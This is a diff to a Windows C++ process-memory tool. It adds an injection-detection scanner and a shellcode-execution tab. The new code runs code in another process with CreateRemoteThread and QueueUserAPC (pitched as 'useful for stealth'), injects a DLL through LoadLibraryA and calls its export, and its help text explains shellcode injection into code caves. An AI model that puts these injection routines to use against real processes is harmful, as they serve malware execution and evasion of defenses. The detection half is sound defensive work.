         B(hPageWnd,"BUTTON","Close (WM_CLOSE)",0,1497,106,165,26,ID_BTN_WND_CLOSE_W);
 
-        
+
+        hHdrDetect=B(hPageDetect,"STATIC","INJECTION DETECTION  (defensive scan against shellcode/stomp/section-mapping)",0,5,5,900,18,0,hFontSection);
+
+        hChkDetectRx    =B(hPageDetect,"BUTTON","Private RX regions (shellcode)",  BS_AUTOCHECKBOX,5,30,260,22,ID_CHK_DETECT_RX,    hFontSmall);
+        hChkDetectMapped=B(hPageDetect,"BUTTON","Mapped RX sections (NtMapView)",  BS_AUTOCHECKBOX,270,30,270,22,ID_CHK_DETECT_MAPPED,hFontSmall);
+        hChkDetectStomp =B(hPageDetect,"BUTTON","Module .text divergence (stomp)", BS_AUTOCHECKBOX,545,30,260,22,ID_CHK_DETECT_STOMP, hFontSmall);
+        hChkDetectThread=B(hPageDetect,"BUTTON","Threads w/ start outside modules",BS_AUTOCHECKBOX,810,30,290,22,ID_CHK_DETECT_THREAD,hFontSmall);
+
+        hChkDetectRwx   =B(hPageDetect,"BUTTON","RWX regions (write+exec)",        BS_AUTOCHECKBOX,5,54,260,22,ID_CHK_DETECT_RWX,   hFontSmall);
+        hChkDetectManMap=B(hPageDetect,"BUTTON","Manual-mapped PE images",         BS_AUTOCHECKBOX,270,54,270,22,ID_CHK_DETECT_MANMAP,hFontSmall);
+        hChkDetectHijack=B(hPageDetect,"BUTTON","Thread RIP hijack (suspends thr)",BS_AUTOCHECKBOX,545,54,260,22,ID_CHK_DETECT_HIJACK,hFontSmall);
+        hChkDetectPath  =B(hPageDetect,"BUTTON","Modules from suspicious paths",   BS_AUTOCHECKBOX,810,54,290,22,ID_CHK_DETECT_PATH, hFontSmall);
+
+        SendMessage(hChkDetectRx,    BM_SETCHECK,BST_CHECKED,0);
+        SendMessage(hChkDetectMapped,BM_SETCHECK,BST_CHECKED,0);
+        SendMessage(hChkDetectStomp, BM_SETCHECK,BST_CHECKED,0);
+        SendMessage(hChkDetectThread,BM_SETCHECK,BST_CHECKED,0);
+        SendMessage(hChkDetectRwx,   BM_SETCHECK,BST_CHECKED,0);
+        SendMessage(hChkDetectManMap,BM_SETCHECK,BST_CHECKED,0);
+        SendMessage(hChkDetectPath,  BM_SETCHECK,BST_CHECKED,0);
+
+        hBtnDetectScan =B(hPageDetect,"BUTTON","Run Detection Scan",0,5,82,180,28,ID_BTN_DETECT_SCAN);
+        hBtnDetectCopy =B(hPageDetect,"BUTTON","Copy Findings",     0,190,82,120,28,ID_BTN_DETECT_COPY);
+        hBtnDetectClear=B(hPageDetect,"BUTTON","Clear",             0,315,82,80,28,ID_BTN_DETECT_CLEAR);
+        hBtnDumpSelected=B(hPageDetect,"BUTTON","Dump Selected",     0,400,82,120,28,ID_BTN_DUMP_SELECTED);
+
+        B(hPageDetect,"STATIC",
+          "Compares loaded modules against their on-disk image, flags executable regions that are not file-backed,",
+          0,5,116,1880,16,0,hFontSmall);
+        B(hPageDetect,"STATIC",
+          "and lists thread start/RIP addresses outside loaded modules. Read-only - never modifies the target.",
+          0,5,132,1880,16,0,hFontSmall);
+
+        hLstDetect=MakeDE(hPageDetect,5,154,1890,580,ID_LST_DETECT);
+
+        B(hPageDetect,"STATIC","Dump Output:",0,5,740,100,20,0,hFontSmall);
+        hEditDump=MakeDE(hPageDetect,5,760,1890,230,ID_EDIT_DUMP);
+
+
+        hHdrShellcode=B(hPageShellcode,"STATIC","SHELLCODE EXECUTION  (trigger injected code)",0,5,5,500,18,0,hFontSection);
+        B(hPageShellcode, "BUTTON", "❓ Help / Instructions", BS_PUSHBUTTON, 1600, 5, 140, 24, ID_BTN_HELP_SHELLCODE, hFontSmall);
+        B(hPageShellcode,"STATIC","Address:",0,5,32,60,22,0);
+        hEditShellAddr=B(hPageShellcode,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,70,28,200,26,0,hFontMono);
+        hBtnExecShellcode=B(hPageShellcode,"BUTTON","Execute Shellcode",0,280,28,150,26,ID_BTN_EXEC_SHELLCODE);
+
+        B(hPageShellcode,"STATIC","Thread ID (for APC):",0,5,65,120,22,0);
+        hEditThreadId=B(hPageShellcode,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,130,61,100,26,0,hFontMono);
+        hBtnExecAPC=B(hPageShellcode,"BUTTON","Execute via APC",0,280,61,120,26,ID_BTN_EXEC_APC);
+
+        B(hPageShellcode,"STATIC","DLL Path:",0,5,100,60,22,0);
+        hEditScDllPath=B(hPageShellcode,"EDIT","",WS_BORDER|ES_AUTOHSCROLL,70,96,280,26,0,hFontMono);
+        B(hPageShellcode,"BUTTON","Browse",0,360,96,70,26,ID_BTN_SC_BROWSE_DLL);
+        B(hPageShellcode,"STATIC","Export:",0,440,100,60,22,0);
+        hEditScExportFunc=B(hPageShellcode,"EDIT","shellcode_entry",WS_BORDER|ES_AUTOHSCROLL,500,96,140,26,0,hFontMono);
+        hBtnExecDllExport=B(hPageShellcode,"BUTTON","Inject && Call",0,650,96,110,26,ID_BTN_SC_EXEC_DLL_EXPORT);
+
+        B(hPageShellcode,"STATIC","Info: Remote Thread = create new thread | APC = queue to existing thread | DLL Export = inject DLL and call exported function",0,5,130,1000,40,0,hFontSmall);
+
+
         hStatusWnd=CreateWindowA("STATIC",
             "Ready - type or browse a PID and click Attach.  All panels are selectable: click, Ctrl+A, Ctrl+C.",
             WS_CHILD|WS_VISIBLE|SS_SUNKEN,0,1040,1920,24,hWnd,NULL,hInst,NULL);
@@ -2063,7 +2969,7 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
            hCtrl==hHdrMods||hCtrl==hHdrWatch||hCtrl==hHdrInject||
            hCtrl==hHdrStrWriter||hCtrl==hHdrAobPatch||hCtrl==hHdrWndWriter||
            hCtrl==hHdrDllInject||hCtrl==hHdrShellcode||hCtrl==hHdrBuilder||
-           hCtrl==hHdrCaves||hCtrl==hHdrThreads)
+           hCtrl==hHdrCaves||hCtrl==hHdrThreads||hCtrl==hHdrDetect)
             SetTextColor(hdc,CLR_TEXT_HDR);
         else if(hCtrl==hStaticOffsetInfo||hCtrl==hStaticScanCount||
                 hCtrl==hStaticAddressInfo||hCtrl==hStaticSelWnd)
@@ -2076,7 +2982,7 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         HDC hdc=(HDC)wParam; HWND hCtrl=(HWND)lParam;
         if(hCtrl==hScanResultsWnd||hCtrl==hMemoryMapWnd||hCtrl==hHexViewWnd||
            hCtrl==hLstModules||hCtrl==hLstWatchList||hCtrl==hLstCaves||hCtrl==hLstThreads||
-           hCtrl==hLstWindows){
+           hCtrl==hLstWindows||hCtrl==hLstDetect){
             SetBkColor(hdc,CLR_BG_LIST);SetTextColor(hdc,CLR_TEXT_LIST);
             return(LRESULT)hBrushList;
         }
@@ -2100,6 +3006,14 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
             if(hPageMods)   SetWindowPos(hPageMods,  NULL,px,py,pw,ph,SWP_NOZORDER);
             if(hPageInject) SetWindowPos(hPageInject,NULL,px,py,pw,ph,SWP_NOZORDER);
             if(hPageWnd)    SetWindowPos(hPageWnd,   NULL,px,py,pw,ph,SWP_NOZORDER);
+            if(hPageDetect) SetWindowPos(hPageDetect,NULL,px,py,pw,ph,SWP_NOZORDER);
+            if(hPageShellcode) SetWindowPos(hPageShellcode,NULL,px,py,pw,ph,SWP_NOZORDER);
+            if(hLstDetect){
+                int dx = std::max(0,pw-10);
+                int dy = std::max(0,ph-400);
+                SetWindowPos(hLstDetect,NULL,5,130,dx,dy,SWP_NOZORDER);
+                SetWindowPos(hEditDump,NULL,5,ph-240,dx,230,SWP_NOZORDER);
+            }
         }
         break;
     }
@@ -2112,6 +3026,8 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
             ShowWindow(hPageMods,   sel==1?SW_SHOW:SW_HIDE);
             ShowWindow(hPageInject, sel==2?SW_SHOW:SW_HIDE);
             ShowWindow(hPageWnd,    sel==3?SW_SHOW:SW_HIDE);
+            ShowWindow(hPageDetect, sel==4?SW_SHOW:SW_HIDE);
+            ShowWindow(hPageShellcode, sel==5?SW_SHOW:SW_HIDE);
         }
         break;
     }
@@ -2277,12 +3193,13 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
                 int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
                 char buf[512]={};GetWindowTextA(hEditNewValue,buf,512);
                 bool prot=(SendMessage(hChkProtect,BM_GETCHECK,0,0)==BST_CHECKED);
+                bool useSyscall=(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED);
                 if(dt==DT_INT32||dt==DT_FLOAT){
                     Backup4 bk={};ReadProcessMemory(hProcess,selectedAddress,bk.data,4,NULL);
                     backups[selectedAddress]=bk;
                 }
-                if(WriteTypedValue(selectedAddress,buf,dt,prot)){
-                    char msg[256];sprintf_s(msg,"Wrote %s to 0x%p%s",buf,(void*)selectedAddress,prot?" (bypass)":"");
+                if(WriteTypedValue(selectedAddress,buf,dt,prot,useSyscall)){
+                    char msg[256];sprintf_s(msg,"Wrote %s to 0x%p%s",buf,(void*)selectedAddress, useSyscall?" (syscall)":(prot?" (bypass)":""));
                     LogToStatus(msg);ShowHexAtAddress(selectedAddress,selectedAddress);
                     EnableWindow(hBtnUndo,TRUE);
                 } else LogToStatus("Write failed — try Bypass checkbox or run as Admin",true);
@@ -2303,6 +3220,52 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         case ID_BTN_INJECT_CODE: InjectShellcode(); break;
         case ID_BTN_SCAN_CAVES:  ScanCodeCaves(); break;
         case ID_BTN_LIST_THREADS:ListRemoteThreads(); break;
+
+        case ID_BTN_DETECT_SCAN:  RunInjectionDetection(); break;
+        case ID_BTN_DETECT_COPY:  CopyEditToClipboard(hLstDetect); break;
+        case ID_BTN_DETECT_CLEAR: ClearEditText(hLstDetect); break;
+        case ID_BTN_DUMP_SELECTED:{
+            DWORD start=0, end=0;
+            SendMessage(hLstDetect, EM_GETSEL, (WPARAM)&start, (LPARAM)&end);
+            if(start == end) { LogToStatus("Select a line in the detection results first", true); break; }
+            int li = (int)SendMessage(hLstDetect, EM_LINEFROMCHAR, (WPARAM)start, 0);
+            int ls = (int)SendMessage(hLstDetect, EM_LINEINDEX, (WPARAM)li, 0);
+            int ll = (int)SendMessage(hLstDetect, EM_LINELENGTH, (WPARAM)ls, 0);
+            if(ll <= 0 || ll >= 1024) { LogToStatus("Invalid line", true); break; }
+            std::string buf(ll + 2, '\0');
+            buf[0] = (char)(ll & 0xFF); buf[1] = (char)((ll >> 8) & 0xFF);
+            SendMessageA(hLstDetect, EM_GETLINE, (WPARAM)li, (LPARAM)&buf[0]);
+            const char* p = strstr(buf.c_str(), "0x");
+            if(!p) { LogToStatus("No address found in line", true); break; }
+            uintptr_t addr = (uintptr_t)strtoull(p, nullptr, 16);
+            if(!addr) { LogToStatus("Invalid address", true); break; }
+            std::vector<BYTE> data(0x1000);
+            SIZE_T read = 0;
+            if(!ReadProcessMemory(hProcess, (LPCVOID)addr, data.data(), data.size(), &read) || read == 0) {
+                LogToStatus("Failed to read memory", true); break;
+            }
+            std::string dump;
+            char line[128];
+            for(size_t i = 0; i < read; i += 16) {
+                sprintf_s(line, "%016llX: ", (unsigned long long)(addr + i));
+                dump += line;
+                for(int j = 0; j < 16; j++) {
+                    if(i + j < read) sprintf_s(line, "%02X ", data[i + j]);
+                    else strcpy_s(line, "   ");
+                    dump += line;
+                }
+                dump += " ";
+                for(int j = 0; j < 16; j++) {
+                    char c = (i + j < read) ? data[i + j] : ' ';
+                    dump += (c >= 32 && c <= 126) ? c : '.';
+                }
+                dump += "\r\n";
+            }
+            SetEditText(hEditDump, dump.c_str());
+            char msg[128]; sprintf_s(msg, "Dumped 0x%llX bytes from 0x%llX", (unsigned long long)read, (unsigned long long)addr);
+            LogToStatus(msg);
+            break;
+        }
 
         case ID_BTN_BROWSE_DLL:{
             char path[MAX_PATH]={};OPENFILENAMEA ofn={};ofn.lStructSize=sizeof(ofn);
@@ -2358,7 +3321,7 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
                 switch(dt){
                     case DT_INT8:  {int8_t  v=(int8_t)atoi(buf);  memcpy(freezeBytes,&v,1);freezeByteLen=1;break;}
                     case DT_INT16: {int16_t v=(int16_t)atoi(buf); memcpy(freezeBytes,&v,2);freezeByteLen=2;break;}
-                    case DT_INT64: {int64_t v=(int64_t)_atoi64(buf);memcpy(freezeBytes,&v,8);freezeByteLen=8;break;}
+                    case DT_INT64: {int64_t v=_strtoi64(buf,NULL,10);memcpy(freezeBytes,&v,8);freezeByteLen=8;break;}
                     case DT_FLOAT: {float   v=(float)atof(buf);   memcpy(freezeBytes,&v,4);freezeByteLen=4;break;}
                     case DT_DOUBLE:{double  v=atof(buf);           memcpy(freezeBytes,&v,8);freezeByteLen=8;break;}
                     default:       {int32_t v=atoi(buf);           memcpy(freezeBytes,&v,4);freezeByteLen=4;break;}
@@ -2371,8 +3334,8 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
             }
             break;
 
-        case ID_BTN_WRITE_UTF8:  WriteStringToAddress(selectedAddress,false); break;
-        case ID_BTN_WRITE_UTF16: WriteStringToAddress(selectedAddress,true);  break;
+        case ID_BTN_WRITE_UTF8:  WriteStringToAddress(selectedAddress,false,(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED)); break;
+        case ID_BTN_WRITE_UTF16: WriteStringToAddress(selectedAddress,true,(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED));  break;
         case ID_BTN_READ_STRING: ReadStringAtAddress(selectedAddress);         break;
 
         case ID_BTN_AOB_PATCH: DoAobPatchReplace(); break;
@@ -2493,6 +3456,221 @@ LRESULT CALLBACK WndProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
             LogToStatus(msg,!ok);
             break;
         }
+
+        case ID_BTN_EXEC_SHELLCODE:{
+            if(!hProcess||!currentPID){LogToStatus("Attach to a process first",true);break;}
+            char addrStr[256]={};GetWindowTextA(hEditShellAddr,addrStr,256);
+            uintptr_t addr=(uintptr_t)strtoull(addrStr,nullptr,0);
+            if(!addr){LogToStatus("Enter a valid address",true);break;}
+            HANDLE hThread=CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)addr,NULL,0,NULL);
+            if(hThread){
+                CloseHandle(hThread);
+                char msg[128];sprintf_s(msg,"Executed shellcode at 0x%llX",(unsigned long long)addr);
+                LogToStatus(msg);
+            }else{
+                LogToStatus("Failed to execute shellcode",true);
+            }
+            break;
+        }
+
+        case ID_BTN_EXEC_APC:{
+            if(!hProcess||!currentPID){LogToStatus("Attach to a process first",true);break;}
+            char addrStr[256]={};GetWindowTextA(hEditShellAddr,addrStr,256);
+            uintptr_t addr=(uintptr_t)strtoull(addrStr,nullptr,0);
+            if(!addr){LogToStatus("Enter a valid address",true);break;}
+            char tidStr[256]={};GetWindowTextA(hEditThreadId,tidStr,256);
+            DWORD tid=(DWORD)strtoul(tidStr,nullptr,0);
+            if(!tid){LogToStatus("Enter a valid thread ID for APC",true);break;}
+            HANDLE hThread=OpenThread(THREAD_SET_CONTEXT,FALSE,tid);
+            if(!hThread){LogToStatus("Failed to open thread",true);break;}
+            if(QueueUserAPC((PAPCFUNC)addr,hThread,0)){
+                LogToStatus("APC queued to thread");
+            }else{
+                LogToStatus("Failed to queue APC",true);
+            }
+            CloseHandle(hThread);
+            break;
+        }
+
+        case ID_BTN_SC_BROWSE_DLL:{
+            OPENFILENAMEA ofn={};
+            char path[MAX_PATH]={};
+            ofn.lStructSize=sizeof(ofn);ofn.hwndOwner=hWnd;
+            ofn.lpstrFilter="DLL Files (*.dll)\0*.dll\0All Files\0*.*\0";
+            ofn.lpstrFile=path;ofn.nMaxFile=MAX_PATH;
+            ofn.lpstrTitle="Select DLL to Inject";ofn.Flags=OFN_FILEMUSTEXIST;
+            if(GetOpenFileNameA(&ofn)){
+                SetWindowTextA(hEditScDllPath,path);
+                LogToStatus("DLL path selected");
+            }
+            break;
+        }
+
+        case ID_BTN_SC_EXEC_DLL_EXPORT:{
+            if(!hProcess||!currentPID){
+                LogToStatus("Attach to a process first",true);
+                break;
+            }
+            char dllPath[MAX_PATH]={}; GetWindowTextA(hEditScDllPath,dllPath,MAX_PATH);
+            if(!dllPath[0]){ LogToStatus("Select a DLL file first",true); break; }
+            char funcName[256]={}; GetWindowTextA(hEditScExportFunc,funcName,256);
+            if(!funcName[0]){ LogToStatus("Enter export function name",true); break; }
+            
+            LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+            if(!pRemotePath){ LogToStatus("VirtualAllocEx failed for DLL path",true); break; }
+            SIZE_T written=0;
+            if(!WriteProcessMemory(hProcess, pRemotePath, dllPath, strlen(dllPath)+1, &written)){
+                VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+                LogToStatus("WriteProcessMemory failed for DLL path",true); break;
+            }
+            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemotePath, 0, NULL);
+            if(!hThread){
+                VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+                LogToStatus("CreateRemoteThread (LoadLibrary) failed",true); break;
+            }
+            WaitForSingleObject(hThread, 10000);
+            DWORD hMod=0;
+            GetExitCodeThread(hThread, &hMod);
+            CloseHandle(hThread);
+            VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
+            if(!hMod){
+                LogToStatus("LoadLibrary failed – DLL not loaded (maybe x86/x64 mismatch)",true);
+                break;
+            }
+            
+            HMODULE remoteBase = FindModuleByPath(currentPID, dllPath);
+            if(!remoteBase){
+                LogToStatus("DLL loaded but could not locate its base address (module enumeration)",true);
+                break;
+            }
+            
+            DWORD rva = GetExportRVA(dllPath, funcName);
+            if(rva==0){
+                char err[512]; sprintf_s(err,"Export '%s' not found in DLL", funcName);
+                LogToStatus(err,true);
+                break;
+            }
+            
+            LPVOID remoteFunc = (LPVOID)((uintptr_t)remoteBase + rva);
+            hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteFunc, NULL, 0, NULL);
+            if(hThread){
+                CloseHandle(hThread);
+                char okMsg[512]; sprintf_s(okMsg,"Executed DLL export '%s' at 0x%p", funcName, remoteFunc);
+                LogToStatus(okMsg);
+                PopulateModuleList();
+            }else{
+                LogToStatus("CreateRemoteThread for export failed",true);
+            }
+            break;
+        }
+
+        case ID_BTN_HELP_MODULES:
+            MessageBoxA(hWnd,
+                "=== MODULES & DLL TAB ===\n\n"
+                "[Module List]\n"
+                "- Shows all loaded modules (DLLs/EXEs) in the target process.\n"
+                "- Click a module line to select it.\n"
+                "- Right‑click? Not needed – use the buttons below.\n\n"
+                "[Refresh] – Reloads the module list (do this after DLL inj).\n\n"
+                "[Eject Selected] – Unloads the selected module using FreeLibrary.\n"
+                "  * Works only if the module was loaded via LoadLibrary (not a static import).\n"
+                "  * Click a module line first, then click Eject.\n\n"
+                "[DLL INJ]\n"
+                "  * Enter full path to a DLL (or use Browse).\n"
+                "  * Click 'Inject DLL (LoadLibraryA)' – the DLL is loaded into the target process.\n"
+                "  * The module list will automatically refresh after inj.\n"
+                "  * To eject, select the DLL in the list and click 'Eject Selected'.\n\n"
+                "⚠️ Make sure the DLL architecture (x86/x64) matches the target process.\n"
+                "⚠️ The target process must have enough privileges (run as Admin).\n"
+                "⚠️ For manual mapping / reflective injection, use the Code Inj tab instead.",
+                "Modules & DLL Help", MB_OK | MB_ICONINFORMATION);
+            break;
+
+        case ID_BTN_HELP_INJECT:
+            MessageBoxA(hWnd,
+                "=== CODE INJ TAB ===\n\n"
+                "[SHELLCODE INJ]\n"
+                "1. Write or paste your shellcode as hex bytes, e.g.: 90 90 C3\n"
+                "2. Choose memory protection: RWX (write+exec) or RX (exec only).\n"
+                "3. Click 'Load .bin File' to load raw binary from disk.\n"
+                "4. Click 'Alloc + Execute' – allocates memory, writes shellcode, creates a remote thread.\n\n"
+                "[SHELLCODE BUILDER]\n"
+                "  * Quickly generate common x64/x86 shellcode patterns:\n"
+                "    - Set value (mov dword [addr], val)\n"
+                "    - Add value\n"
+                "    - Subtract value\n"
+                "    - Zero out\n"
+                "    - NOP sled\n"
+                "  * Enter target address and value, select arch, click Build.\n"
+                "  * Copy the generated hex to the inj field.\n\n"
+                "[OPEN ASSEMBLER] – Opens a separate window to write Intel syntax assembly\n"
+                "  and convert it directly to shellcode bytes.\n\n"
+                "[CODE CAVE SCANNER]\n"
+                "  * Scans for regions of 0x00 or 0x90 bytes (candidate caves).\n"
+                "  * Set minimum size, click Scan Caves.\n"
+                "  * Select a cave from the list, then click 'Inject SC to Cave' to write\n"
+                "    the current shellcode into that cave and execute it.\n\n"
+                "[REMOTE THREADS]\n"
+                "  * List all threads in the target process with their start addresses.\n"
+                "  * Select a thread and click 'Kill Selected' to terminate it.\n"
+                "  * Use 'Suspend Threads' / 'Resume Threads' to pause/resume all threads of the process.\n\n"
+                "⚠️ Improper shellcode can crash the target. Test in a safe environment first.",
+                "Code Inj Help", MB_OK | MB_ICONINFORMATION);
+            break;
+
+        case ID_BTN_HELP_WNDWRITER:
+            MessageBoxA(hWnd,
+                "=== WINDOW WRITER TAB ===\n\n"
+                "[REFRESH WINDOWS] – Lists all top‑level windows belonging to the attached process,\n"
+                "  including child controls. The list shows HWND, class name, and window title.\n\n"
+                "Click any line → the window is selected (HWND appears at the top).\n\n"
+                "[TEXT OPERATIONS]\n"
+                "  * Type text in 'Text to set'.\n"
+                "  * 'Send WM_SETTEXT' – sets the window/control text (like a paste).\n"
+                "  * 'Get WM_GETTEXT' – reads the current text into the edit box.\n\n"
+                "[POST MESSAGE]\n"
+                "  * Send any custom message (WM_xxx) with wParam and lParam.\n"
+                "  * Example: WM_CLOSE (0x0010) to close the window.\n\n"
+                "[WM_COMMAND]\n"
+                "  * Send a command message to a control (e.g., button click).\n"
+                "  * Enter the control's command ID (often seen in Spy++).\n\n"
+                "[WINDOW ACTIONS]\n"
+                "  * Focus / Foreground – bring window to top.\n"
+                "  * Hide / Show – toggle visibility.\n"
+                "  * Enable / Disable – grey out controls.\n"
+                "  * Minimize / Maximize / Restore – resize the window.\n"
+                "  * Close (WM_CLOSE) – politely ask the window to close.\n\n"
+                "⚠️ This tab works on any window/control of the attached process,\n"
+                "  including other processes' windows (if you have sufficient privileges).",
+                "Window Writer Help", MB_OK | MB_ICONINFORMATION);
+            break;
+
+        case ID_BTN_HELP_SHELLCODE:
+            MessageBoxA(hWnd,
+                "=== SHELLCODE EXECUTION TAB ===\n\n"
+                "This tab lets you trigger already injected shellcode or DLL exports.\n\n"
+                "[EXECUTE SHELLCODE]\n"
+                "  * Enter the address where your shellcode resides (e.g., from a code cave).\n"
+                "  * Click 'Execute Shellcode' – creates a new remote thread at that address.\n\n"
+                "[EXECUTE VIA APC]\n"
+                "  * Same as above, but queues the shellcode as an Asynchronous Procedure Call\n"
+                "    to an existing thread (specify Thread ID).\n"
+                "  * Useful for stealth or when the target thread is in an alertable wait state.\n\n"
+                "[DLL INJECT && CALL EXPORT]\n"
+                "  * Select a DLL file (Browse).\n"
+                "  * Specify an exported function name (e.g., 'Start', 'EntryPoint').\n"
+                "  * Click 'Inject && Call' – the tool will:\n"
+                "      1. Inject the DLL via LoadLibrary.\n"
+                "      2. Locate the exported function in the remote process.\n"
+                "      3. Create a remote thread to execute that function.\n"
+                "  * The module list will refresh automatically.\n\n"
+                "⚠️ The DLL must match the target process architecture (x86/x64).\n"
+                "⚠️ The exported function should accept no arguments (void) or be safe to call\n"
+                "    from a new thread (e.g., do not rely on DLL_PROCESS_ATTACH initialisation).\n\n"
+                "Use the Code Inj tab to first inject shellcode or a DLL, then use this tab\n"
+                "to trigger it repeatedly or by different methods.",
+                "Shellcode Exec Help", MB_OK | MB_ICONINFORMATION);
+            break;
 
         }
         break;
